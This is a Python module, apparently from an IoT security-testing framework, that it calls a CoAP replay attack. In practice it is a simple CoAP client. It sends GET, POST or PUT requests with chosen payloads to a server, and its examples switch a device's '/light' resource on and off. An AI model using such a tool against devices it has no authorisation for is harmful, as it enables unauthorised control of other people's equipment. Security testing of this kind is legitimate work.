import socket
import sys
import argparse
from coapthon.client.helperclient import HelperClient
from coapthon.utils import parse_uri

client = None

def parse_args(args):
    parser = argparse.ArgumentParser(prog="frame.py coap_replay_attack",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     description="This module facilitates the use of a replay attack against the COAP Server.",
                                     epilog="""Example usage:

    frame.py coap_replay_attack -op GET -path coap://192.168.8.113:5683/light
    frame.py coap_replay_attack -op POST -pay 1 -path coap://192.168.8.113:5683/light
    frame.py coap_replay_attack -op POST -pay 0 -path coap://192.168.8.113:5683/light
    frame.py coap_replay_attack -op PUT -pay 1 -path coap://192.168.8.113:5683/light
    frame.py coap_replay_attack -op PUT -pay 0 -path coap://192.168.8.113:5683/light""")

    parser.add_argument("-op", "--option",help="Restfull methods(GET,PUT,POST)", type=str)
    parser.add_argument("-pay","--payload",help="Payload to be sent to the server (-pay 0) ", type=str)
    parser.add_argument("-path", "--path",help="Path must be like this:coap://192.168.8.113:5683/light",
                         type=str)

    args = parser.parse_args(args)
    return args

def client_callback(response):
    print("Callback")


def replay(args):  # pragma: no cover
    global client

    if args.option is None:
        print("Operation must be specified")
        sys.exit(2)

    if args.path is None:
        print("Path must be specified")
        sys.exit(2)

    if not args.path.startswith("coap://"):
        print("Path must be conform to coap://host[:port]/path")
        sys.exit(2)

    host, port, args.path = parse_uri(args.path)
    try:
        tmp = socket.gethostbyname(host)
        host = tmp
    except socket.gaierror:
        pass
    client = HelperClient(server=(host, port))
    if args.option == "GET":
        if args.path is None:
            print("Path cannot be empty for a GET request")
            sys.exit(2)
        print(args.path)
        print(host)
        print(port)
        response = client.get(args.path)
        print(response.pretty_print())
        client.stop()

    elif args.option == "POST":
        if args.path is None:
            print("Path cannot be empty for a POST request")
            sys.exit(2)

        if args.payload is None:
            print("Payload cannot be empty for a POST request")
            sys.exit(2)
        response = client.post(args.path, args.payload)
        print(response.pretty_print())
        client.stop()

    elif args.option == "PUT":
        if args.path is None:
            print("Path cannot be empty for a PUT request")
            sys.exit(2)
        if args.payload is None:
            print("Payload cannot be empty for a PUT request")
            sys.exit(2)
        response = client.put(args.path, args.payload)
        print(response.pretty_print())
        client.stop()

    else:
        print("Operation not recognized")
        sys.exit(2)


def module_main(args):
    args = parse_args(args)
    replay(args)
